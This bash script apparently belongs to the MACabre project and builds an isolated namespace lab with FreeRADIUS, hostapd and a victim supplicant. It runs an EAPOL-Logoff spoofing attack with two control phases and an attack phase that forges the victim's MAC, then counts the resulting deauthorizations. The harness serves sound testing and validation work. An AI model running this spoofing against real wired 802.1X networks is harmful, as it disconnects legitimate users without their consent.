#!/usr/bin/env bash
# Isolated EAPOL logoff spoofing lab (Linux only, needs root).
#
# Topology: one bridge (the LAN) with three hosts attached:
#
#   auth:     FreeRADIUS (local, 127.0.0.1:1812) and hostapd in wired mode, the 802.1X
#             authenticator on h-auth.
#   client:   the victim supplicant, wpa_supplicant with EAP-MD5 (user alice). It authenticates
#             first and keeps its authorization until the lab checks.
#   attacker: MACabre's EAPOL-Logoff spoofing, sent from the attacker's own MAC and from the
#             victim's MAC.
#
# Phases (after the victim is authenticated):
#   Phase 1 (control): nothing is sent. The victim must stay authorized.
#   Phase 2 (control): logoffs claim the attacker's own MAC. The victim must stay authorized.
#   Phase 3 (attack): logoffs claim the victim's MAC. The authenticator should deauthorize the
#            victim, which hostapd logs as AP-STA-DISCONNECTED for that MAC.
#
# The lab counts the victim's AP-STA-DISCONNECTED lines in hostapd's log for each phase.
#
# Requirements: FreeRADIUS with IPv4 listeners only, and a test user alice (password
# password) in its authorize file. The sandbox used for development was set up that way;
# on another host, set it up the same way before running the lab.
#
# What the lab shows: whether an authenticator that trusts the EAPOL-Logoff source MAC
# deauthorizes that MAC. It does not test vendor authenticators, the RADIUS session
# after logoff, or the data-plane effect (hostapd's wired driver does not filter the bridge).
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/eapol_logoff_spoofing_lab.sh
#   sudo LOGOFFS=5 scripts/lab/eapol_logoff_spoofing_lab.sh
#
# Requirements: iproute2, hostapd, wpasupplicant, freeradius, and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

if ! command -v ip >/dev/null 2>&1; then
    echo "Missing required tool: ip" >&2
    exit 1
fi
HOSTAPD="$(command -v hostapd 2>/dev/null || echo /usr/sbin/hostapd)"
WPA_SUPPLICANT="$(command -v wpa_supplicant 2>/dev/null || echo /usr/sbin/wpa_supplicant)"
FREERADIUS="$(command -v freeradius 2>/dev/null || echo /usr/sbin/freeradius)"
for tool in "$HOSTAPD" "$WPA_SUPPLICANT" "$FREERADIUS"; do
    if [[ ! -x "$tool" ]]; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done
RADIUS_DIR=/etc/freeradius/3.0
if ! grep -q '^alice' "$RADIUS_DIR/mods-config/files/authorize" 2>/dev/null; then
    echo "FreeRADIUS needs the test user alice in $RADIUS_DIR/mods-config/files/authorize." >&2
    exit 2
fi

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
LOGOFFS="${LOGOFFS:-3}"
WORK="$(mktemp -d)"

stop_lab() {
    for ns in auth client attacker; do
        for pid in $(ip netns pids "$ns" 2>/dev/null || true); do
            kill "$pid" 2>/dev/null || true
        done
    done
    for ns in attacker client auth lan; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
cleanup() {
    stop_lab
    rm -rf "$WORK"
}
trap cleanup EXIT

stop_lab

ip netns add lan
ip netns add auth
ip netns add client
ip netns add attacker

for pair in "auth:auth" "cli:client" "att:attacker"; do
    name="${pair%%:*}"
    ns="${pair##*:}"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$ns"
    ip link set "p-$name" netns lan
done

# group_fwd_mask 8 lets the bridge forward the 802.1X PAE group address.
ip netns exec lan ip link add br0 type bridge group_fwd_mask 8
ip netns exec lan ip link set br0 up
for name in auth cli att; do
    ip netns exec lan ip link set "p-$name" master br0
    ip netns exec lan ip link set "p-$name" up
done

ip netns exec auth ip link set lo up
ip netns exec auth ip link set h-auth up
ip netns exec client ip link set lo up
ip netns exec client ip link set h-cli up
ip netns exec attacker ip link set lo up
ip netns exec attacker ip link set h-att up

ATTACKER_MAC="$(ip netns exec attacker cat /sys/class/net/h-att/address)"

cat >"$WORK/hostapd.conf" <<EOF
driver=wired
interface=h-auth
logger_stdout=-1
logger_stdout_level=2
ieee8021x=1
eap_reauth_period=3600
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=testing123
EOF

cat >"$WORK/supplicant.conf" <<EOF
ctrl_interface=$WORK/wpa
network={
    key_mgmt=IEEE8021X
    eap=MD5
    identity="alice"
    password="password"
    eapol_flags=0
}
EOF

ip netns exec auth "$FREERADIUS" -f -d "$RADIUS_DIR" >"$WORK/radius.log" 2>&1 &
sleep 4
ip netns exec auth "$HOSTAPD" "$WORK/hostapd.conf" >"$WORK/hostapd.log" 2>&1 &
sleep 3
if [[ -z "$(ip netns pids auth 2>/dev/null)" ]]; then
    echo "hostapd or FreeRADIUS did not start. Logs:" >&2
    tail -10 "$WORK/radius.log" >&2
    tail -10 "$WORK/hostapd.log" >&2
    exit 2
fi
ip netns exec client "$WPA_SUPPLICANT" -D wired -i h-cli -c "$WORK/supplicant.conf" >"$WORK/supplicant.log" 2>&1 &

VICTIM_MAC="$(ip netns exec client cat /sys/class/net/h-cli/address)"

authenticated() {
    grep -c "STA $VICTIM_MAC IEEE 802.1X: authenticated" "$WORK/hostapd.log" 2>/dev/null || true
}
disconnects() {
    grep -c "AP-STA-DISCONNECTED $VICTIM_MAC" "$WORK/hostapd.log" 2>/dev/null || true
}

echo "Setup: waiting for the victim to authenticate"
for _ in $(seq 1 30); do
    [[ "$(authenticated)" -ge 1 ]] && break
    sleep 1
done
if [[ "$(authenticated)" -lt 1 ]]; then
    echo "The victim did not authenticate. Result unreliable." >&2
    exit 2
fi
echo "  victim $VICTIM_MAC authenticated"
echo

LOGOFF_CODE='
import os, sys
from macabre.attacks.eapol_logoff_spoofing import EapolLogoffSpoofingConfig, run_eapol_logoff_spoofing
import threading
stats = run_eapol_logoff_spoofing(
    EapolLogoffSpoofingConfig(iface="h-att", source_mac=os.environ["CLAIM_MAC"], logoffs=int(os.environ["LOGOFFS"])),
    threading.Event(),
    lambda _: None,
)
print(stats.logoffs)
'

run_logoffs() {
    local claim="$1"
    ip netns exec attacker env PYTHONPATH="$ROOT/src" CLAIM_MAC="$claim" LOGOFFS="$LOGOFFS" \
        "$PY" -c "$LOGOFF_CODE" 2>/dev/null || echo 0
}

echo "Phase 1: control, nothing sent"
BEFORE="$(disconnects)"
sleep 5
AFTER="$(disconnects)"
P1_DELTA=$(( AFTER - BEFORE ))
echo "  victim disconnects during the wait: $P1_DELTA"
echo

echo "Phase 2: control, $LOGOFFS logoffs claiming the attacker's own MAC"
BEFORE="$(disconnects)"
SENT2="$(run_logoffs "$ATTACKER_MAC")"
sleep 3
AFTER="$(disconnects)"
P2_DELTA=$(( AFTER - BEFORE ))
echo "  logoffs sent: $SENT2"
echo "  victim disconnects after them: $P2_DELTA"
echo

echo "Phase 3: attack, $LOGOFFS logoffs claiming the victim's MAC"
BEFORE="$(disconnects)"
SENT3="$(run_logoffs "$VICTIM_MAC")"
sleep 3
AFTER="$(disconnects)"
P3_DELTA=$(( AFTER - BEFORE ))
echo "  logoffs sent: $SENT3"
echo "  victim disconnects after them: $P3_DELTA"
echo

if (( P1_DELTA == 0 && P2_DELTA == 0 && P3_DELTA >= 1 )); then
    echo "Result: the authenticator deauthorized the victim after logoffs that claimed its MAC ($P3_DELTA disconnect(s)). Logoffs from another MAC, and no logoff, left the victim authorized."
    exit 0
fi
if (( P1_DELTA != 0 || P2_DELTA != 0 )); then
    echo "Control: the victim was disconnected without a spoofed logoff. Result unreliable."
    exit 2
fi
echo "Result: the authenticator did not deauthorize the victim in this run. Not validated."
exit 1
